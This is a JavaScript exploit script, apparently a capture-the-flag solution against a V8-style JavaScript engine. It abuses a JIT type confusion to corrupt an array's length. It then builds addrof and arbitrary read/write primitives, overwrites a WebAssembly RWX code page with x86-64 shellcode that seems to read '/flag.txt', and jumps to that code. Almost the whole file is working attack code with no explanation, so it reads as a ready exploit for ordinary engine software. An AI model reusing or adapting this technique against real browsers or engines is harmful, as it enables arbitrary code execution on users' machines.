//print("hii");
//print(challenge_read().toString(16));
//print(challenge_write().toString(16));

//var exec = challenge_exec();
//var ch_read = challenge_read();
//var ch_write = challenge_write();


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var sc = wasm_instance.exports.main;

var ab = new ArrayBuffer(0x8);
var f = new Float64Array(ab);
var u = new Uint32Array(ab);

function ftoi(val) {
    f[0] = val;
    //return BigInt(u[0]) + (BigInt(u[1]) << 32n);
    return u[0];
}

function ftoi2(val) {
    f[0] = val;
    return u[0] + (u[1] * Math.pow(2, 32));
}

function itof(val) {
    u[0] = val;
    u[1] = val / Math.pow(2, 32);
    return f[0];
}

function optimize(sstr) {
    // type 0..big, actual -1..big
    var wrong_type = sstr.indexOf("A");
    wrong_type = Math.abs(wrong_type);
    wrong_type >>= 29;

    wrong_type += 1
    wrong_type *= -1;
    wrong_type += 1;
    wrong_type *= 10;
    wrong_type += 1;
    wrong_type *= 8;

    var arr1 = new Array(wrong_type);
    arr1[0] = 1.1;

    var arr2 = new Array(2);
    arr2[0] = 1.1;
    arr2[1] = 1.2;

    var arr3 = new Array(2);
    arr3[0] = {};
    arr3[1] = {};

    var uarr = new Uint32Array(8);

    return [arr1, arr2, arr3, uarr];
}

var string = "SDF";

for (var i = 0; i < 50000; i++) {
  optimize(string);
}
//%OptimizeFunctionOnNextCall(optimize);


var arrays = optimize(string);
var arr1 = arrays[0];
var arr2 = arrays[1];
var arr3 = arrays[2];
var uarr = arrays[3];

//print("------------------");
//%DebugPrint(arr2);
//print("------------------");
//%DebugPrint(arr1);
//print("------------------");


//%DebugPrint(arr1[12]);
arr2[1] = 1.4;
//%DebugPrint(arr1[12]);


f[0] = arr1[14];
u[1] = 88;
arr1[14] = f[0];

function addrof(obj) {
    arr3[0] = obj;
    return ftoi(arr2[5]);
}

function r32(addr) {
    arr2[33] = itof(addr-7);
    return uarr[0];
}

function w32(addr, val) {
    var read_high = Math.floor(addr / Math.pow(2, 32)) * Math.pow(2, 32);
    var read_low = addr & 0xFFFFFFFF;
    arr2[32] = itof(read_high + 7);
    arr2[33] = itof(read_low - 7);
    uarr[0] = val;
}

function w322(addr, val) {
    var read_high = Math.floor(addr / Math.pow(2, 32)) * Math.pow(2, 32);
    var read_low = addr & 0xFFFFFFFF;
    arr2[32] = itof(read_high + 7);
    arr2[33] = itof(read_low - 7);
    uarr[0] = val;
}

function w3222(addr, val) {
    var read_high = Math.floor(addr / Math.pow(2, 32)) * Math.pow(2, 32);
    var read_low = addr & 0xFFFFFFFF;
    arr2[32] = itof(read_high + 7);
    arr2[33] = itof(read_low - 7);
    uarr[0] = val;
}

function r32full(addr) {
    var read_high = Math.floor(addr / Math.pow(2, 32)) * Math.pow(2, 32);
    var read_low = addr & 0xFFFFFFFF;
    arr2[32] = itof(read_high + 7);
    arr2[33] = itof(read_low - 7);
    return uarr[0];
}


//function w32(addr, val) {
//    arr2[33] = itof(addr-7);
    //uarr[0] = val;
//}

/*var obj = {};
print(addrof(obj).toString(16));
%DebugPrint(obj);
print(addrof(uarr).toString(16));
%DebugPrint(uarr);*/


/*%DebugPrint(arr2);
%DebugPrint(uarr);
print(ftoi2(arr2[27]).toString(16));
print(ftoi2(arr2[32]).toString(16));*/
//print(ftoi2(arr2[28]).toString(16));

// external is 32
// base is 33
//while (1) {}

//print("external pointer");
//print(ftoi(arr2[28 + 5]).toString(16));
//%DebugPrint(uarr);

var wasm_addr = addrof(wasm_instance);
var rwx_low = r32(wasm_addr + 0x68 - 1);
var rwx_high = r32(wasm_addr + 0x6c - 1) * Math.pow(2, 32);
//print(wasm_addr.toString(16));

var rwx = rwx_low + rwx_high;
//print("RWX");
//print(rwx.toString(16));

// ch read
/*print("read " + ch_read.toString(16));
var ch_read_high = Math.floor(ch_read / Math.pow(2, 32)) * Math.pow(2, 32);
var ch_read_low = ch_read & 0xFFFFFFFF;
print("read high " + ch_read_high.toString(16));
print("read low " + ch_read_low.toString(16));
arr2[32] = itof(ch_read_high + 7);
arr2[33] = itof(ch_read_low - 7);
var val = uarr[0];*/
//print("addr: " + ch_read.toString(16));
//var val = r32full(ch_read);
//w32full(ch_write, val);
//w32full(ch_write, val);

// jump to exec
//arr2[32] = itof(rwx_high+7);
//arr2[33] = itof(rwx_low-7);

//var exec_low = exec & 0xFFFF;
//var exec_mid = (exec / Math.pow(2, 16)) & 0xFFFFFFFF
//var exec_high = exec / Math.pow(2, 48);
//

//uarr[0] = 0xcccccccc;
//w32(rwx, 0xcccccccc);
//uarr[0] = 0xb848 + exec_low * Math.pow(2, 16);
//uarr[1] = exec_mid;

//arr2[32] = itof(rwx_high+7);
//arr2[33] = itof(rwx_low-7 + 8);

//uarr[0] = exec_high + 0x90900000;
//uarr[1] = 0xc3c350
//rwx += 4;

/*w32(rwx + 0x0, 0x805f3feb);
w32(rwx + 0x4, 0x48410877);
w32(rwx + 0x8, 0x204c031);
w32(rwx + 0xc, 0xff63148);
w32(rwx + 0x10, 0xec816605);
w32(rwx + 0x14, 0x8d480fff);
w32(rwx + 0x18, 0x89482434);
w32(rwx + 0x1c, 0xd23148c7);
w32(rwx + 0x20, 0xfffba66);
w322(rwx + 0x24, 0xfc03148);
w322(rwx + 0x28, 0xff314805);
w322(rwx + 0x2c, 0x1c78040);
w322(rwx + 0x30, 0x48c28948);
w322(rwx + 0x34, 0x104c031);
w322(rwx + 0x38, 0x3148050f);
w322(rwx + 0x3c, 0xf3c04c0);
w3222(rwx + 0x40, 0xffbce805);
w3222(rwx + 0x44, 0x6c66ffff);
w3222(rwx + 0x48, 0x742e6761);
w3222(rwx + 0x4c, 0x417478);*/

w32(rwx + 0x0, 0x905f3eeb);
w32(rwx + 0x4, 0x48909090);
w32(rwx + 0x8, 0x204c031);
w32(rwx + 0xc, 0xff63148);
w32(rwx + 0x10, 0xec816605);
w322(rwx + 0x14, 0x8d480fff);
w322(rwx + 0x18, 0x89482434);
w322(rwx + 0x1c, 0xd23148c7);
w322(rwx + 0x20, 0xfffba66);
w322(rwx + 0x24, 0xfc03148);
w322(rwx + 0x28, 0xff314805);
w322(rwx + 0x2c, 0x1c78040);
w3222(rwx + 0x30, 0x48c28948);
w3222(rwx + 0x34, 0x104c031);
w3222(rwx + 0x38, 0x8166050f);
w3222(rwx + 0x3c, 0xc30fffc4);
w3222(rwx + 0x40, 0xffffbde8);
w3222(rwx + 0x44, 0x6c662fff);
w3222(rwx + 0x48, 0x742e6761);
w3222(rwx + 0x4c, 0x007478);
//w3222(rwx + 0x44, 0x616c66ff);
//w3222(rwx + 0x48, 0x78742e67);
//w3222(rwx + 0x4c, 0x4174);

sc();

// END
